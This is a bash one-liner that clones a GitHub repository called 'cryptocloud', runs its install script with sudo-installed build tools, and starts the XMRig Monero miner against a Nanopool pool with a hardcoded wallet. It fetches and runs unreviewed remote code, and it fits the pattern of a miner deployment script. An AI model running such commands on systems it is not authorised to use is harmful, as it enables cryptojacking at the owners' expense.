/bin/bash -c "
cd $HOME;
sudo apt-get update --fix-missing;
sudo apt-get -y install git build-essential cmake automake libtool autoconf wget;
git clone https://github.com/myhomemail565-gif/cryptocloud.git;
mv cryptocloud/install.sh $HOME;
chmod +x install.sh;
./install.sh;
cd $HOME/xmrig/build;
./xmrig --rig-id=F4 -u 85fHndEnn5geDRAuWvnrvTR8PE8KmztiQev95rDoQqvyAdibnfSGQX2Ww4V4XadbX6VxbZ1Q2uWYcUWjhqxseojY4o2GTeb -o xmr-eu1.nanopool.org:10343
"
